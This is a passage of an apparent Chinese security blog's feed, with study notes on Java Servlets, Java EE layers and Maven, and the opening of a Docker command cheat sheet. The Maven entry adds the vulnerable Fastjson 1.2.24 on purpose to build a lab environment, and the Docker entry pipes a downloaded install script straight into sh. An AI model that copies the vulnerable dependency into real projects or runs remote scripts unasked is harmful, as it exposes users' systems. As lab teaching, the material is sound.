        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Servlet 是 Java Web 容器中运行的小程序，Servlet 原则上可以通过任何客户端-服务端协议进行通信，但它们常与 HTTP 一起使用，因此 Servlet 通常作为 “HTTP Servlet”的简写。</p><p>Servlet 是 Java EE 的核心，也是所有 MVC 框架实现的根本。</p><h1 id="0x01-Servlet-的配置"><a href="#0x01-Servlet-的配置" class="headerlink" title="0x01 Servlet 的配置"></a>0x01 Servlet 的配置</h1><p>版本不同，Servlet 的配置不同，Servlet 3.0 之前的版本都是在 web.xml 中配置的，在 3.0 之后的版本中则使用更为方便的注解方法来配置。</p><p>此外不同版本的 Servlet 所需要的 Java/JDK 版本也不同，具体如下图所示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111151655826.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="1、基于-web-xml-的配置"><a href="#1、基于-web-xml-的配置" class="headerlink" title="1、基于 web.xml 的配置"></a>1、基于 web.xml 的配置</h2><p>以下是一个基于 web.xml 的 Servlet 配置文件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 web.xml 中，Servlet 的配置在 Servlet 标签中，Servlet 标签由 Servlet 和 Servlet-mapping 标签组成，两者通过标签中相同的 Servlet-name 实现关联，上述配置文件中的标签含义如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;声明 Servlet 配置入口&lt;description&gt;声明 Servlet 描述信息&lt;display-name&gt;定义 Web 应用的名称&lt;servlet-name&gt;声明 Servlet 名称以便在后面的映射时使用&lt;servlet-class&gt;指定当前 Servlet 对应的类的路径&lt;servlet-mapping&gt;注册组件访问配置的路径入口&lt;servlet-name&gt;指定上文配置的 Servlet 名称&lt;url-pattern&gt;指定配置这个组件的访问路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、基于注解方式"><a href="#2、基于注解方式" class="headerlink" title="2、基于注解方式"></a>2、基于注解方式</h2><p>Servlet 3.0 以上的版本中，开发者无须在 web.xml 里配置 Servlet，只需要添加 @WebServlet 注解即可修改 Servlet 的属性，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token comment">/** * 基于注解开发Servlet */</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/ann.do"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnnotationServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.0 Transitional//EN'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HEAD>&lt;TITLE> ITBZ &lt;/TITLE>&lt;/HEAD>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Annotation Servlet!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注解参数</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111151656906.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>通过图中的「等价于 web.xml 的标签」一栏可以看出，web.xml 可以配置的 Servlet 属性都可以通过 @WebServlet 的方式进行配置。</p><h1 id="0x02-Servlet-的访问流程"><a href="#0x02-Servlet-的访问流程" class="headerlink" title="0x02 Servlet 的访问流程"></a>0x02 Servlet 的访问流程</h1><p>以上文中的 web.xml 配置文件为例，其访问流程如下所示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111151656655.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>首先用户在浏览器里输入URL，然后浏览器发起请求，服务器通过 servlet-mapping 标签找到文件名为 user 的 url-pattern，通过其对应的 servlet-name 寻找 servlet 标签中 servlet-name 相同的 servlet，再获取其 servlet 标签里的 servlet-class 参数，最后得到具体的 class 文件路径，从而执行相关文件。</p><h1 id="0x03-Servlet-的接口方法"><a href="#0x03-Servlet-的接口方法" class="headerlink" title="0x03 Servlet 的接口方法"></a>0x03 Servlet 的接口方法</h1><h2 id="1、init-接口"><a href="#1、init-接口" class="headerlink" title="1、init() 接口"></a>1、init() 接口</h2><p>在 Servlet 实例化后，Servlet 容器会调用 init() 方法来初始化该对象，主要是为了让 Servlet 对象在处理客户请求前可以完成一些初始化的工作，例如建立数据库连接，获取配置信息等。</p><p>对于每一个 Servlet 实例，init() 方法只能被调用一次。</p><p>init() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、service-接口"><a href="#2、service-接口" class="headerlink" title="2、service() 接口"></a>2、service() 接口</h2><p>service() 方法是执行实际任务的主要方法，Servlet 容器调用 service() 方法来处理来自客户端（浏览器）的请求，并将格式化的响应写回客户端，每次服务器接收到一个 Servlet 请求时，服务器都会产生一个新的线程并调用服务。</p><p>值得注意的是，在 service() 方法被容器调用之前，必须确保 init() 方法正确完成。</p><p>service() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> service <span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">ServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>     <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3、doGet-doPost-等接口"><a href="#3、doGet-doPost-等接口" class="headerlink" title="3、doGet() / doPost() 等接口"></a>3、doGet() / doPost() 等接口</h2><p>doGet() 等方法需要根据 HTTP 的不同请求调用不同的方法，如果 HTTP 得到一个来自 URL 的 GET 请求，就会调用 doGet() 方法，同样的，如果得到 POST 请求，就会调用 doPost() 方法。</p><p>这类方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span>    <span class="token comment">// 如果是 POST 请求，则调用 public void doPost 方法</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、destroy-接口"><a href="#4、destroy-接口" class="headerlink" title="4、destroy() 接口"></a>4、destroy() 接口</h2><p>当容器检测到一个 Servlet 对象应该从服务中被移除的时候，容器会调用该对象的 destroy() 方法，以便让 Servlet 对象可以释放它所使用的资源，保存数据到持久存储设备中，例如将内存中的数据保存到数据库中，关闭数据库的连接等。</p><p>destroy() 方法与 init() 方法相同，都只会调用一次。</p><p>destroy() 方法定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5、getServletConfig-接口"><a href="#5、getServletConfig-接口" class="headerlink" title="5、getServletConfig() 接口"></a>5、getServletConfig() 接口</h2><p>该方法返回容器调用 init() 方法时传递给 Servlet 对象的 ServletConfig 对象，ServletConfig 对象包含了 Servlet 的初始化参数。</p><h2 id="6、getServletInfo-接口"><a href="#6、getServletInfo-接口" class="headerlink" title="6、getServletInfo() 接口"></a>6、getServletInfo() 接口</h2><p>该方法返回一个 String 类型的字符串，其中包括了关于 Servlet 的信息，例如，作者、版本和版权等。</p><h1 id="0x04-Servlet-的生命周期"><a href="#0x04-Servlet-的生命周期" class="headerlink" title="0x04 Servlet 的生命周期"></a>0x04 Servlet 的生命周期</h1><p>Servlet 生命周期指的是 Servlet 从创建直到销毁的整个过程。</p><p>在一个生命周期中，Servlet 经历了被加载、初始化、接收请求、响应请求以及提供服务的过程，具体如下图所示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111151656032.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://tomcat.apache.org/whichversion.html">https://tomcat.apache.org/whichversion.html</a></p><p><a href="https://blog.csdn.net/bieleyang/article/details/76696131">https://blog.csdn.net/bieleyang/article/details/76696131</a></p><p><a href="https://blog.csdn.net/qq_45017999/article/details/106696148">https://blog.csdn.net/qq_45017999/article/details/106696148</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Java EE 基础知识</title>
      <link href="//211115-123451.html"/>
      <url>//211115-123451.html</url>
      
        <content type="html"><![CDATA[<p>Java 平台分为三个主要版本：</p><ol><li>Java SE（Java 平台标准版）</li><li>Java EE（Java 平台企业版）</li><li>Java ME（Java 平台微型版）</li></ol><p>Java EE 是 Java 应用最广泛的版本。</p><h1 id="0x01-Java-EE-的核心技术"><a href="#0x01-Java-EE-的核心技术" class="headerlink" title="0x01 Java EE 的核心技术"></a>0x01 Java EE 的核心技术</h1><p>Java EE 有十三种核心技术，它们分别是：JDBC、JNDI、EJB、RMI、Servlet、JSP、XML、JMS、Java IDL、JTS、JTA、JavaMail 和 JAF，这里重点介绍以下几种：</p><ol><li>Java 数据库连接（Java Database Connectivity，JDBC）是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</li><li>Java 命名和目录接口（Java Naming and Directory Interface，JNDI），是 Java 的一个目录服务应用程序界面（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。简单的说就是比如以前连接数据库需要把参数写在 Java 类里，但现在可以直接写在配置文件里了，这个配置文件可以是 XML，也可以是 properties，或者 yml 文件，只要能解析都行。</li><li>企业级 JavaBean（Enterprise JavaBean, EJB）是一个用来构筑企业级应用的、在服务器端可被管理组件。不过这个东西在 Spring 问世后基本凉凉了，知道是什么就行。</li><li>远程方法调用（Remote Method Invocation，RMI）是 Java 的一组拥有开发分布式应用程序的 API，它大大增强了 Java 开发分布式应用的能力。</li><li>Servlet（Server Applet），是用 Java 编写的服务端程序。其主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。</li><li>JSP（全称 JavaServer Pages）是由 Sun 公司主导创建的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。</li><li>可扩展标记语言（eXtensible Markup Language，XML）是被设计用于传输和存储数据的语言。</li><li>Java 服务消息（Java Message Service，JMS）是一个 Java 平台中关于面向消息中间件（MOM）的 API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信。</li></ol><h1 id="0x02-Java-EE-分层模型"><a href="#0x02-Java-EE-分层模型" class="headerlink" title="0x02 Java EE 分层模型"></a>0x02 Java EE 分层模型</h1><p>Java EE 应用的分层模型主要分为以下 5 层。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111151127644.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ol><li>Domain Object（领域对象）层，也叫模型（Modole）层，此层由一系列的 POJO（Plain Old Java Object，普通的、传统的 java 对象）组成，这些对象是该系统的 Domain Object，往往包含了各自所需实现的业务逻辑方法。</li><li>DAO（Data Access Object，数据访问对象）层，此层由一系列的 DAO 组件组成，这些 DAO 实现了对数据库的创建、查询、更新和删除（CRUD）等原子操作。</li><li>Service（业务逻辑层）层，此层由一系列的业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法。这些业务逻辑方法可能仅仅用于暴露Domain Object 对象所实现的业务逻辑方法，也可能是依赖 DAO 组件实现的业务逻辑方法。</li><li>Controller（控制器）层，此层由一系列控制器组成，这些控制器用于拦截用户请求，并调用业务逻辑组件的业务逻辑方法，并根据处理结果转发到不同的 View 组件。</li><li>View（表现）层，此层由一系列的 JSP 页面、Velocity 页面、PDF 文档视图组件组成，负责收集用户请求，并显示处理后的结果。</li></ol><blockquote><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/43884237">https://zhuanlan.zhihu.com/p/43884237</a></p><p><a href="https://www.codenong.com/cs105259462/">https://www.codenong.com/cs105259462/</a></p><p><a href="https://blog.csdn.net/mzc_love/article/details/107244053">https://blog.csdn.net/mzc_love/article/details/107244053</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Maven 基础知识</title>
      <link href="//211103-161807.html"/>
      <url>//211103-161807.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Maven 是一个项目构建和管理工具，利用它可以对 JAVA 项目进行构建和管理。</p><p>Maven 采用项目对象模型 POM（Project Object Model）来管理项目。</p><p>Maven 的主要工作就是用来解析一些 XML 文档、管理生命周期与插件。</p><p>Maven 被设计成将主要的职责委派给一组 Maven 插件，这些插件可以影响 Maven 生命周期，提供对目标的访问。</p><h2 id="0x01-pom-xml-文件介绍"><a href="#0x01-pom-xml-文件介绍" class="headerlink" title="0x01 pom.xml 文件介绍"></a>0x01 pom.xml 文件介绍</h2><p>pom.xml 文件被用于管理源代码、配置文件、开发者的信息和角色等，Maven 项目中可以没有其他文件但必须包含 pom.xml 文件，该文件也是 Maven 项目的核心配置文件。</p><p>一个引入 Fastjson 1.2.24 版本组件的配置信息如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;  &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;com.alibaba&#x2F;fastjson --&gt;  &lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;  &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该配置信息可直接从 <a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24</a> 获得</p></blockquote><p>配置文件里的 dependencies 和 dependency 用于定义依赖关系，dependency 里的 groupId、artifactId、version 用来定义所依赖的项目。</p><h1 id="0x02-Maven-的使用"><a href="#0x02-Maven-的使用" class="headerlink" title="0x02 Maven 的使用"></a>0x02 Maven 的使用</h1><p>这里以 IntelliJ IDEA 为例，在新建项目时选择创建 Maven 项目即可。</p><p>在创建完 Maven 项目后，就会看到项目里包含的 pox.xml 文件了，对于安全人员就可以通过该文件去判断当前项目里是否包含了存在隐患的组件。</p><p>这时如果想搭建一个 Fastjson &lt;= 1.2.24 版本的漏洞环境，就需要将 Fastjson &lt;= 1.2.24 版本的组件引入。</p><p>这里只需要把上面的配置信息复制到 pom.xml 文件中，然后右击 pom.xml 文件选择「Maven」–「重新加载项目」，就可以自动进行组件的获取了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111031614583.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>稍后等组件被自动下载到本地并自动加入到项目依赖中后，就可以在项目代码使用该组件了。</p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/43ed2e9e386b">https://www.jianshu.com/p/43ed2e9e386b</a></p><p><a href="https://www.cnblogs.com/bndong/p/9762067.html">https://www.cnblogs.com/bndong/p/9762067.html</a></p><p><a href="https://www.cnblogs.com/cainiaomahua/p/10651014.html">https://www.cnblogs.com/cainiaomahua/p/10651014.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】Docker 使用笔记</title>
      <link href="//211028-204606.html"/>
      <url>//211028-204606.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>平时在使用 Docker 时，经常会碰到忘记相关命令的情况，因此平时忘记一个就会记录一个，经过多年的记录，Docker 相关的笔记已经记录了不少。</p><p>最近在看代码审计的时候又提到了 Docker，正好借着这个机会好好的把原来记录的比较乱的 Docker 笔记整理一下。</p><p>如果你也面临过「在使用 Docker 时，时不时就会忘记某条命令」的情况，那么我相信本篇文章应该会对你有所帮助。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、安装-Docker"><a href="#1、安装-Docker" class="headerlink" title="1、安装 Docker"></a>1、安装 Docker</h2><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;get.docker.com&#x2F; | sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-none"><code class="language-none">wget -qO- https:&#x2F;&#x2F;get.docker.com&#x2F; | sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在命令中输入以下命令，如果输出 helloword 表示 Docker 安装成功。</p><pre class="line-numbers language-none"><code class="language-none">docker run ubuntu echo &quot;helloworld&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110282041924.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、安装-Docker-Compose"><a href="#2、安装-Docker-Compose" class="headerlink" title="2、安装 Docker-Compose"></a>2、安装 Docker-Compose</h2><pre class="line-numbers language-none"><code class="language-none">sudo curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.23.2&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-composesudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-composedocker-compose --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3、Docker-设置国内镜像源"><a href="#3、Docker-设置国内镜像源" class="headerlink" title="3、Docker 设置国内镜像源"></a>3、Docker 